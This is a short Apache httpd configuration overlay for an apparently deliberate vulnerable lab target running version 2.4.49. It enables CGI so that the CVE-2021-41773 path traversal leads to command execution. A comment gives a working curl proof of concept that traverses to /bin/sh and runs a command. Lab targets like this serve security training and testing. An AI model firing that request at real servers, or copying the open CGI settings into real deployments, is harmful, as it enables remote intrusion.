# Target-lab vulnerability overlay for Apache HTTPd 2.4.49 (event MPM).
# Loaded via `Include conf/vuln.conf` appended to the stock httpd.conf.
#
# CVE-2021-41773 (path traversal) is stock behaviour of 2.4.49; this overlay
# only enables mod_cgid (the threaded-MPM CGI variant) so the traversed
# /cgi-bin/ path can execute binaries — verified PoC in README.md:
#   curl --path-as-is -d 'echo; id' \
#     http://vuln-target:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
LoadModule cgid_module modules/mod_cgid.so

ServerName vuln-target

<Location "/cgi-bin">
    Options +ExecCGI
    Require all granted
</Location>
